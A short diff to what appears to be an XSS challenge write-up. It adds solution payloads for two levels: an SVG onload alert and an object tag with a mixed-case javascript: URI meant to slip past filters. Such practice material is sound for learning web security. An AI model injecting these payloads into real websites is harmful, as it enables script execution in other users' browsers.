@@ -2,7 +2,14 @@
 
 ## Level 1
 
+```html
+<svg/onload=alert()>
+```
 ## Level 2
+
+```html
+<object data="javascRipt:alert()">
+```
 
 ## Level 3
 
